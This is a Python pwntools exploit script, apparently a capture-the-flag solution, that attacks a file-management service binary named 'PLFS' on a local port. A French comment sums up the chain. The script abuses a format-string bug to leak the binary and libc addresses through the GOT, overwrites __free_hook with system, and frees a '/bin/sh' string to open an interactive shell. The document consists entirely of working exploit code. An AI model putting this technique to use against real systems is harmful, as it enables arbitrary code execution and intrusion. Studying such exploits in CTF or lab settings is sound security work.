#TLDR : format string -> ecriture __free_hook -> shell


from pwn import *
context.arch = 'amd64'
context.endian = 'little'
b = ELF("PLFS")
libc = b.libc

#p = b.process()
p = remote('localhost',1337)

p.recvuntil(b'> ')

p.sendline(b'EnvoyerLeFichier %4$p')
p.recvuntil(b'> ')
p.sendline(b'ListerLesFichiers %')
b.address = (int(p.recvline(), 16) & ~ 0xfff) - 0x2000
print("Binary @ 0x%x" % b.address)
p.sendline(b'SupprimerLeFichier %4$p')
p.recvuntil(b'> ')
p.sendline(b'EnvoyerLeFichier AAAA%20$s')
p.recvuntil(b'> ')
p.sendline(b'EnvoyerLeFichier '+b'A'*15 + p64(b.got['fgets']))  # 15
p.recvuntil(b'> ')
p.sendline(b'ListerLesFichiers AAAA%20$s')
p.recvuntil(b'> ')
leak = u64(p.recvline().rstrip(b'\n').lstrip(b'A'*4).ljust(8, b'\x00'))
libc.address = leak - libc.sym['fgets']
print("libc @ 0x%x" % libc.address)
p.recvuntil(b'> ')
p.sendline(b'SupprimerLeFichier AAAA%20$s')
p.recvuntil(b'> ')
p.sendline(b'SupprimerLeFichier '+b'A'*15 + p64(b.got['fgets']))
p.recvuntil(b'> ')
to_write = {libc.sym['__free_hook']: libc.sym['system']}
atoms = fmtstr.make_atoms(to_write, 2, 2, 4, 1, 'small', b'')
payload = fmtstr.make_payload_dollar(20, atoms, 4)
print(payload)
p.sendline(b'EnvoyerLeFichier AAAA'+payload[0])
p.recvuntil(b'> ')
p.sendline(b'EnvoyerLeFichier '+b'A'*15 + payload[1])  # 15
p.recvuntil(b'> ')
p.sendline(b'ListerLesFichiers A')
p.recvuntil(b'> ')
p.sendline(b'EnvoyerLeFichier /bin/sh')
p.recvuntil(b'> ')
p.sendline(b'SupprimerLeFichier /bin/sh')
p.interactive()
